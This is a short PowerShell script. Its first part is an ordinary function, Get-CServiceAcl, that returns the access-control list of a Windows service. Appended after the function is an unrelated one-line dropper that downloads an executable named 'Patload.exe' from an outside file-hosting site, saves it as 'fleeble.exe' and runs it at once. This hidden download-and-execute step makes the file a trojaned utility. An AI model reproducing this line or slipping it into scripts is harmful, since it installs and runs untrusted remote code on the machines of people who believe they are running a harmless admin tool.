
function Get-CServiceAcl
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Name
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $rawSD = Get-CServiceSecurityDescriptor -Name $Name
    $rawDacl = $rawSD.DiscretionaryAcl
    New-Object Security.AccessControl.DiscretionaryAcl $false,$false,$rawDacl
}


(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'

